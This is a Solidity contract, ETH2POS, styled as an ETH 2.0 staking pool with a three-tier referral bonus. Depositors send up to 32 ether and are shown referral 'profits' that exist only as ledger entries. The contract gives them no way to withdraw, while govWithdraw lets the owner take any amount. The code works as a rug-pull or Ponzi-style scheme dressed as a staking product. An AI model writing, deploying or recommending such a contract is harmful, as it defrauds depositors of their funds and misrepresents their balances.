pragma solidity ^0.5.16;

/**
 * Math operations with safety checks
 */
library SafeMath {
    function add(uint a, uint b) internal pure returns (uint) {
        uint c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }
    function sub(uint a, uint b) internal pure returns (uint) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint a, uint b, string memory errorMessage) internal pure returns (uint) {
        require(b <= a, errorMessage);
        uint c = a - b;

        return c;
    }
    function mul(uint a, uint b) internal pure returns (uint) {
        if (a == 0) {
            return 0;
        }

        uint c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }
    function div(uint a, uint b) internal pure returns (uint) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint a, uint b, string memory errorMessage) internal pure returns (uint) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint c = a / b;

        return c;
    }
}

/**
 * @title Ownable
 * @dev The Ownable contract has an owner address, and provides basic authorization control
 * functions, this simplifies the implementation of "user permissions".
 */
contract Ownable {
    address public owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    /**
     * @dev The Ownable constructor sets the original `owner` of the contract to the sender
     * account.
     */
    constructor() public {
        owner = msg.sender;
    }


    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }


    /**
     * @dev Allows the current owner to transfer control of the contract to a newOwner.
     * @param newOwner The address to transfer ownership to.
     */
    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0));
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
    }
}

contract ETH2POS is Ownable{
    using SafeMath for uint;


    mapping (address => address) public vipLevelToUp;
    mapping (address => address[]) public vipLevelToDown;

    mapping (address => uint) private _stakeMap;
    mapping (address => uint) private _profitMap;
    uint256 private _totalStake;
    uint256 private _totalProfit;

    mapping (uint32  => address) private _userList;
    uint32 private _currentUserCount;

    event Deposit(address indexed from, uint256 amount);
    event VipLevelPro(address indexed from, address indexed to,uint256 amount, uint8 level);
    event AddAdviser(address indexed down, address indexed up);
    event GovWithdraw(address indexed to, uint256 value);

    uint constant private minDepositValue = 100 finney;
    uint constant private maxDepositValue = 32 ether;
    uint constant private vipBaseProfit = 3;
    uint constant private vipExtraStakeRate = 10 ether;

    constructor()public {
    }

    function depositWithAdviser(address _adviser) public payable{
        require(_adviser != address(0) , "zero address input");
        if(_stakeMap[msg.sender] == 0){
            if( _adviser != msg.sender && isUser(_adviser)){
                vipLevelToUp[msg.sender] = _adviser;
                emit AddAdviser(msg.sender,_adviser);
            }
        }
        deposit();
    }

    function deposit() public payable{
        uint oldValue = _stakeMap[msg.sender];
        uint newValue = oldValue.add(msg.value);
        require(msg.value >= minDepositValue, "!min deposit value");
        require(newValue <= maxDepositValue, "!max deposit value");

        if(oldValue==0){
            _userList[_currentUserCount] = msg.sender;
            _currentUserCount++;
        }
        _stakeMap[msg.sender] = newValue;
        _totalStake = _totalStake.add(msg.value);
        doVipLevelProfit(oldValue, msg.value);

        emit Deposit(msg.sender, msg.value);
    }
    function doVipLevelProfit(uint oldValue, uint addValue) private {
        address current = msg.sender;
        for(uint8 i = 1;i<=3;i++){
            address upper = vipLevelToUp[current];
            if(upper == address(0)){
                return;
            }
            if(oldValue == 0){
                vipLevelToDown[upper].push(msg.sender);
            }
            uint profit = vipBaseProfit*i* addValue /100;
            _profitMap[upper] = _profitMap[upper].add(profit);
            _totalProfit = _totalProfit.add(profit);
            emit VipLevelPro(msg.sender,upper,profit,i);
            current = upper;
        }
    }

    function govWithdraw(uint256 _amount)onlyOwner public {
        require(_amount > 0, "!zero input");
        msg.sender.transfer(_amount);
        emit GovWithdraw(msg.sender, _amount);
    }

    function isUser(address account) private view returns (bool) {
        return _stakeMap[account]>0;
    }

    function pureStakeOf(address account) public view returns (uint) {
        return _stakeMap[account];
    }

    function profitOf(address account) public view returns (uint) {
        return _profitMap[account];
    }

    function stakeOf(address account) public view returns (uint) {
        return _stakeMap[account]+ _profitMap[account];
    }

    function totalStake() public view returns (uint) {
        return _totalStake+_totalProfit;
    }

    function currentUserCount() public view returns (uint32) {
        return _currentUserCount;
    }

    function userList(uint32 i) public view returns (address) {
        return _userList[i];
    }
}